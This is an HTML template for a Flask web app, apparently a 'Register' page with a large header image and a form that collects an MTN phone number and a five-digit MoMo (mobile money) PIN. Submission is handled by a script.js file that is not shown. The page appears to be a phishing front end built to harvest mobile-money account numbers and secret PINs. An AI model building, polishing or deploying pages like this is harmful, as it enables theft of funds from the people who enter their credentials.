<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Register</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
</head>
<body>
    <div class="main-container">
        
        <!-- Top Image Section (2/3 height) -->
        <div class="photo-header">
            <img src="{{ url_for('static', filename='images/Image.jpeg') }}" 
                 alt="Header Image" 
                 class="header-image">
        </div>

        <!-- Form Section (1/3 height) -->
        <div class="form-section">
            <form id="registrationForm">
                <input type="tel" 
                       id="mtnNumber"
                       name="mtn_number"
                       placeholder="MTN NUMBER" 
                       required maxlength="15">

                <div class="pin-wrapper">
                    <input type="password" 
                           id="momoPin"
                           name="momo_pin"
                           placeholder="MOMO PIN" 
                           required 
                           maxlength="5" 
                           minlength="5">
                    <span class="toggle-pin" onclick="togglePinVisibility()">👁️</span>
                </div>

                <button type="submit" class="btn" id="submitBtn">REGISTER</button>
            </form>

            <div id="messageContainer" class="message-container"></div>
        </div>
    </div>

    <script src="{{ url_for('static', filename='script.js') }}"></script>
</body>
</html>
